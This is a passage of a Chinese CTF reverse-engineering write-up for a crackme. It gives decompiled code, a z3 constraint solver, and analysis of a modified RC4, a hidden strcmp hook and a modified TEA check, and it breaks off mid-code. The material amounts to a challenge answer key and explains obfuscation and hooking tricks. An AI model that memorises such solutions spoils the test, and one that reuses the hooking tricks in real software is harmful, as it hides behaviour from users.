sub_140002FD0(<span class="string">&quot;Give me the bait:&quot;</span>, argv, envp);</span><br><span class="line">  sub_140003050(<span class="string">&quot;%s&quot;</span>, v13);</span><br><span class="line">  <span class="keyword">if</span> ( sub_140001150((<span class="type">unsigned</span> __int8 *)v13) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_140002FD0(<span class="string">&quot;Yes!This bait is a good one.\n\n&quot;</span>, v3, v4);</span><br><span class="line">    sub_140002FD0(<span class="string">&quot;Give me the second thing:&quot;</span>, v5, v6);</span><br><span class="line">    sub_140003050(<span class="string">&quot;%s&quot;</span>, v14);</span><br><span class="line">    sub_140002FD0(<span class="string">&quot;\nFishing...\n\n&quot;</span>, v7, v8);</span><br><span class="line">    Sleep(<span class="number">0x3E8u</span>);</span><br><span class="line">    sub_140002460(v14, Str1, v13);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(Str1, &amp;Str2) )</span><br><span class="line">      sub_140002FD0(<span class="string">&quot;Didn&#x27;t the fish take the bait?\n&quot;</span>, v10, v11);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sub_140002FD0(<span class="string">&quot;Did the fish take the bait?\n&quot;</span>, v10, v11);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_140002FD0(<span class="string">&quot;Oops...This bait is terrible.\n&quot;</span>, v3, v4);</span><br><span class="line">  &#125;</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个是z3约束求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 10 个整型变量，a0 表示 a0，其余 a1~a9</span></span><br><span class="line">a0, a1, a2, a3, a4, a5, a6, a7, a8, a9 = Ints(<span class="string">&#x27;a0 a1 a2 a3 a4 a5 a6 a7 a8 a9&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">202</span> * a8 + <span class="number">216</span> * a5 - <span class="number">4</span> * a4 - <span class="number">330</span> * a9 - <span class="number">13</span> * a4 - <span class="number">268</span> * a6 == -<span class="number">14982</span>,</span><br><span class="line">    <span class="number">325</span> * a8 + <span class="number">195</span> * a0 + <span class="number">229</span> * a1 - <span class="number">121</span> * a6 - <span class="number">409</span> * a6 - (a1 &lt;&lt; <span class="number">7</span>) == <span class="number">22606</span>,</span><br><span class="line">    <span class="number">489</span> * a1 + <span class="number">480</span> * a6 + <span class="number">105</span> * a2 + <span class="number">367</span> * a3 - <span class="number">135</span> * a4 - <span class="number">482</span> * a9 == <span class="number">63236</span>,</span><br><span class="line">    <span class="number">493</span> * a1 - <span class="number">80</span> * a4 - <span class="number">253</span> * a8 - <span class="number">121</span> * a2 - <span class="number">177</span> * a0 - <span class="number">243</span> * a9 == -<span class="number">39664</span>,</span><br><span class="line">    <span class="number">275</span> * a4 + <span class="number">271</span> * a6 + <span class="number">473</span> * a7 - <span class="number">72</span> * a5 - <span class="number">260</span> * a4 - <span class="number">367</span> * a4 == <span class="number">14255</span>,</span><br><span class="line">    <span class="number">286</span> * a0 + <span class="number">196</span> * a7 + <span class="number">483</span> * a2 + <span class="number">442</span> * a1 - <span class="number">495</span> * a8 - <span class="number">351</span> * a4 == <span class="number">41171</span>,</span><br><span class="line">    <span class="number">212</span> * a2 + <span class="number">283</span> * a7 - <span class="number">329</span> * a8 - <span class="number">429</span> * a9 - <span class="number">362</span> * a2 - <span class="number">261</span> * a6 == -<span class="number">90284</span>,</span><br><span class="line">    <span class="number">456</span> * a5 + <span class="number">244</span> * a7 + <span class="number">92</span> * a4 + <span class="number">348</span> * a7 - <span class="number">225</span> * a1 - <span class="number">31</span> * a2 == <span class="number">88447</span>,</span><br><span class="line">    <span class="number">238</span> * a9 + <span class="number">278</span> * a7 + <span class="number">216</span> * a6 + <span class="number">237</span> * a0 + <span class="number">8</span> * a2 - <span class="number">17</span> * a9 == <span class="number">83838</span>,</span><br><span class="line">    <span class="number">323</span> * a9 + <span class="number">121</span> * a1 + <span class="number">370</span> * a7 - (a4 &lt;&lt; <span class="number">6</span>) - <span class="number">196</span> * a9 - <span class="number">422</span> * a0 == <span class="number">26467</span>,</span><br><span class="line">    <span class="number">166</span> * a9 + <span class="number">90</span> * a1 + <span class="number">499</span> * a2 + <span class="number">301</span> * a8 - <span class="number">31</span> * a2 - <span class="number">206</span> * a2 == <span class="number">88247</span>,</span><br><span class="line">    <span class="number">355</span> * a0 + <span class="number">282</span> * a4 + <span class="number">44</span> * a9 + <span class="number">359</span> * a8 - <span class="number">167</span> * a5 - <span class="number">62</span> * a3 == <span class="number">76658</span>,</span><br><span class="line">    <span class="number">488</span> * a6 + <span class="number">379</span> * a9 + <span class="number">318</span> * a2 - <span class="number">85</span> * a1 - <span class="number">357</span> * a2 - <span class="number">277</span> * a5 == <span class="number">35398</span>,</span><br><span class="line">    <span class="number">40</span> * a0 + <span class="number">281</span> * a4 + <span class="number">217</span> * a5 - <span class="number">241</span> * a1 - <span class="number">407</span> * a7 - <span class="number">309</span> * a7 == -<span class="number">35436</span>,</span><br><span class="line">    <span class="number">429</span> * a3 + <span class="number">441</span> * a3 + <span class="number">115</span> * a1 + <span class="number">96</span> * a8 + <span class="number">464</span> * a1 - <span class="number">133</span> * a7 == <span class="number">157448</span></span><br><span class="line">    )</span><br><span class="line"><span class="comment"># 求解约束</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="comment"># 假设求解出来的 a0~a9 是 ASCII 码，将其转换为字符并拼接成字符串</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(m[v].as_long()) <span class="keyword">for</span> v <span class="keyword">in</span> (a0, a1, a2, a3, a4, a5, a6, a7, a8, a9)])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Solution:&quot;</span>, flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution found&quot;</span>)</span><br></pre></td></tr></table></figure><p>后面的函数点进去像是魔改rc4</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_140002460</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v4; <span class="comment">// [rsp+20h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// [rsp+21h] [rbp-17h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+24h] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  sub_1400028B0(a3);</span><br><span class="line">  v7 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 += byte_1400060C0[++v4];</span><br><span class="line">    sub_140002D90(&amp;byte_1400060C0[v4], &amp;byte_1400060C0[v5]);</span><br><span class="line">    *(_BYTE *)(a2 + i) = byte_1400060C0[(<span class="type">unsigned</span> __int8)(byte_1400060C0[v5] + byte_1400060C0[v4])] ^ a1[i];</span><br><span class="line">    *(_BYTE *)(a2 + i) ^= <span class="number">0x14u</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  result = v7;</span><br><span class="line">  *(_BYTE *)(a2 + v7) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是有问题，我在看交换函数sub_140002D90的时候发现了交叉引用<img src="/.io//tool\blog\source\postpic\ghctf2025\1.png" loading="lazy"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.rdata:<span class="number">0000000140004230</span> <span class="number">38</span> <span class="number">32</span> <span class="number">00</span> <span class="number">40</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset ?pre_cpp_initialization@@YAXXZ ; pre_cpp_initialization(<span class="type">void</span>)</span><br><span class="line">.rdata:<span class="number">0000000140004238</span> <span class="number">00</span> <span class="number">10</span> <span class="number">00</span> <span class="number">40</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset sub_140001000</span><br><span class="line">.rdata:<span class="number">0000000140004240</span> <span class="number">20</span> <span class="number">10</span> <span class="number">00</span> <span class="number">40</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset sub_140001020</span><br><span class="line">.rdata:<span class="number">0000000140004248</span> <span class="number">40</span> <span class="number">10</span> <span class="number">00</span> <span class="number">40</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset sub_140001040</span><br></pre></td></tr></table></figure><p>他们的根源都是这个，并且可以猜到是init，初始化的时候调用的，sub_140001000点进去会发现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="title function_">sub_140001AD0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+20h] [rbp-48h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+24h] [rbp-44h]</span></span><br><span class="line">  HMODULE hModule; <span class="comment">// [rsp+28h] [rbp-40h]</span></span><br><span class="line">  FARPROC ProcAddress; <span class="comment">// [rsp+30h] [rbp-38h]</span></span><br><span class="line">  CHAR ProcName[<span class="number">8</span>]; <span class="comment">// [rsp+38h] [rbp-30h] BYREF</span></span><br><span class="line">  CHAR ModuleName[<span class="number">16</span>]; <span class="comment">// [rsp+40h] [rbp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  qmemcpy(ModuleName, <span class="string">&quot;fpagqr`v=w&quot;</span>, <span class="number">10</span>);</span><br><span class="line">  ModuleName[<span class="number">10</span>] = <span class="number">127</span>;</span><br><span class="line">  ModuleName[<span class="number">11</span>] = <span class="number">127</span>;</span><br><span class="line">  ModuleName[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">12</span>; ++i )</span><br><span class="line">    ModuleName[i] ^= <span class="number">0x13u</span>;</span><br><span class="line">  hModule = GetModuleHandleA(ModuleName);<span class="comment">//dll</span></span><br><span class="line">  <span class="built_in">strcpy</span>(ProcName, <span class="string">&quot;`gap~c&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">6</span>; ++j )</span><br><span class="line">    ProcName[j] ^= <span class="number">0x13u</span>;</span><br><span class="line">  ProcAddress = GetProcAddress(hModule, ProcName);<span class="comment">//strcmp</span></span><br><span class="line">  sub_140001C00(ProcAddress, sub_140001CE0);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个是dll的名字，第二个是strcmp函数，所以这里实现了对strcmp函数的hook，后续调用strcmp的时候实际上是调用了sub_140001CE0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_140001CE0</span><span class="params">(_BYTE *a1, <span class="type">unsigned</span> __int8 *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+20h] [rbp-108h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> num; <span class="comment">// [rsp+20h] [rbp-108h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> numa; <span class="comment">// [rsp+20h] [rbp-108h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+24h] [rbp-104h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+24h] [rbp-104h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [rsp+24h] [rbp-104h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [rsp+28h] [rbp-100h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// [rsp+28h] [rbp-100h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// [rsp+28h] [rbp-100h]</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [rsp+2Ch] [rbp-FCh]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+30h] [rbp-F8h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+34h] [rbp-F4h]</span></span><br><span class="line">  <span class="type">int</span> ii; <span class="comment">// [rsp+38h] [rbp-F0h]</span></span><br><span class="line">  <span class="type">int</span> jj; <span class="comment">// [rsp+3Ch] [rbp-ECh]</span></span><br><span class="line">  <span class="type">int</span> kk; <span class="comment">// [rsp+40h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">int</span> mm; <span class="comment">// [rsp+44h] [rbp-E4h]</span></span><br><span class="line">  <span class="type">int</span> nn; <span class="comment">// [rsp+48h] [rbp-E0h]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [rsp+4Ch] [rbp-DCh]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+50h] [rbp-D8h]</span></span><br><span class="line">  <span class="type">int</span> m; <span class="comment">// [rsp+54h] [rbp-D4h]</span></span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// [rsp+58h] [rbp-D0h]</span></span><br><span class="line">  HMODULE hModule; <span class="comment">// [rsp+60h] [rbp-C8h]</span></span><br><span class="line">  FARPROC ProcAddress; <span class="comment">// [rsp+68h] [rbp-C0h]</span></span><br><span class="line">  CHAR LibFileName[<span class="number">16</span>]; <span class="comment">// [rsp+70h] [rbp-B8h] BYREF</span></span><br><span class="line">  CHAR ProcName[<span class="number">16</span>]; <span class="comment">// [rsp+80h] [rbp-A8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v28[<span class="number">3</span>]; <span class="comment">// [rsp+90h] [rbp-98h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v29[<span class="number">11</span>]; <span class="comment">// [rsp+93h] [rbp-95h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v30[<span class="number">8</span>]; <span class="comment">// [rsp+9Eh] [rbp-8Ah] BYREF</span></span><br><span class="line">  <span class="type">char</span> v31[<span class="number">32</span>]; <span class="comment">// [rsp+A8h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v32[<span class="number">6</span>]; <span class="comment">// [rsp+C8h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v33[<span class="number">14</span>]; <span class="comment">// [rsp+E0h] [rbp-48h] BYREF</span></span><br><span class="line">  _BYTE *v34; <span class="comment">// [rsp+130h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  v34 = a1;</span><br><span class="line">  <span class="built_in">memset</span>(v32, <span class="number">0</span>, <span class="number">0x14u</span>i64);</span><br><span class="line">  <span class="built_in">memset</span>(v33, <span class="number">0</span>, <span class="number">0x32u</span>i64);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">20</span>; ++i )</span><br><span class="line">    *((_BYTE *)v32 + i) = a1[i - <span class="number">80</span>];</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">50</span>; ++j )</span><br><span class="line">    *((_BYTE *)v33 + j) = a1[j - <span class="number">56</span>];</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v6 = v33[<span class="number">0</span>];</span><br><span class="line">  v9 = v33[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">24</span>; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 += (v32[v3 &amp; <span class="number">3</span>] + v3) ^ (v9 + ((v9 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v9)));</span><br><span class="line">    v3 += <span class="number">1719109785</span>;</span><br><span class="line">    v9 += (v32[(v3 &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + v3) ^ (v6 + ((v6 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v6)));</span><br><span class="line">  &#125;</span><br><span class="line">  v33[<span class="number">0</span>] = v6;</span><br><span class="line">  v33[<span class="number">1</span>] = v9;</span><br><span class="line">  num = <span class="number">0</span>;</span><br><span class="line">  v7 = v33[<span class="number">2</span>];</span><br><span class="line">  v10 = v33[<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">24</span>; ++m )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 += (v32[num &amp; <span class="number">3</span>] + num) ^ (v10 + ((v10 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v10)));</span><br><span class="line">    num += <span class="number">1719109785</span>;</span><br><span class="line">    v10 += (v32[(num &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + num) ^ (v7 + ((v7 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v7)));</span><br><span class="line">  &#125;</span><br><span class="line">  v33[<span class="number">2</span>] = v7;</span><br><span class="line">  v33[<span class="number">3</span>] = v10;</span><br><span class="line">  numa = <span class="number">0</span>;</span><br><span class="line">  v8 = v33[<span class="number">4</span>];</span><br><span class="line">  v11 = v33[<span class="number">5</span>];</span><br><span class="line">  <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt; <span class="number">24</span>; ++n )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 += (v32[numa &amp; <span class="number">3</span>] + numa) ^ (v11 + ((v11 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v11)));</span><br><span class="line">    numa += <span class="number">1719109785</span>;</span><br><span class="line">    v11 += (v32[(numa &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + numa) ^ (v8 + ((v8 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v8)));</span><br><span class="line">  &#125;</span><br><span class="line">  v33[<span class="number">4</span>] = v8;</span><br><span class="line">  v33[<span class="number">5</span>] = v11;</span><br><span class="line">  v12 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt; <span class="number">24</span>; ++ii )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( byte_1400063C8[ii] != *((<span class="type">unsigned</span> __int8 *)v33 + ii) )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(LibFileName, <span class="string">&quot;dbtc\&quot;#?u&#125;&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> ( jj = <span class="number">0</span>; jj &lt; <span class="number">10</span>; ++jj )</span><br><span class="line">      LibFileName[jj] ^= <span class="number">0x11u</span>;</span><br><span class="line">    hModule = LoadLibraryA(LibFileName);</span><br><span class="line">    <span class="built_in">strcpy</span>(ProcName, <span class="string">&quot;\\tbbpvtS~iP&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> ( kk = <span class="number">0</span>; kk &lt; <span class="number">11</span>; ++kk )</span><br><span class="line">      ProcName[kk] ^= <span class="number">0x11u</span>;</span><br><span class="line">    ProcAddress = GetProcAddress(hModule, ProcName);</span><br><span class="line">    <span class="built_in">strcpy</span>(v31, <span class="string">&quot;H~d6gt1rpdvye1p1sxv1wxby0&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> ( mm = <span class="number">0</span>; mm &lt; <span class="number">25</span>; ++mm )</span><br><span class="line">      v31[mm] ^= <span class="number">0x11u</span>;</span><br><span class="line">    qmemcpy(v28, <span class="string">&quot;R~&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    v28[<span class="number">2</span>] = <span class="number">127</span>;</span><br><span class="line">    qmemcpy(v29, <span class="string">&quot;vcped&#125;pex~&quot;</span>, <span class="number">10</span>);</span><br><span class="line">    v29[<span class="number">10</span>] = <span class="number">127</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(v30, <span class="string">&quot;000&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> ( nn = <span class="number">0</span>; nn &lt; <span class="number">17</span>; ++nn )</span><br><span class="line">      v28[nn] ^= <span class="number">0x11u</span>;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(_QWORD, <span class="type">char</span> *, <span class="type">char</span> *, _QWORD))ProcAddress)(<span class="number">0</span>i64, v31, v28, <span class="number">0</span>i64);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = (<span class="type">unsigned</span> __int8)*v34 - *a2;</span><br><span class="line">    <span class="keyword">if</span> ( v20 || !*v34 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v34;</span><br><span class="line">    ++a2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v20 &gt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( v20 &gt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面这个函数实际上就是实现了tea的魔改，三组就是24位刚好符合，key呢就是前面第一次的输入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//DeluxeBait</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">detea</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* middle,<span class="type">unsigned</span> <span class="type">int</span>* key)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> a1, a2;</span><br><span class="line">    a1 = middle[<span class="number">0</span>];</span><br><span class="line">    a2 = middle[<span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v3 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//for (int i = 0; i &lt; 24; ++i)</span></span><br><span class="line">    <span class="comment">//&#123;</span></span><br><span class="line">    <span class="comment">//    a1 += (key[v3 &amp; 3] + v3) ^ (a2 + ((a2 &gt;&gt; 5) ^ (16 * a2)));</span></span><br><span class="line">    <span class="comment">//    v3 += 1719109785;</span></span><br><span class="line">    <span class="comment">//    a2 += ((key[(v3 &gt;&gt; 11) &amp; 3] + v3) ^ (a1 + ((a1 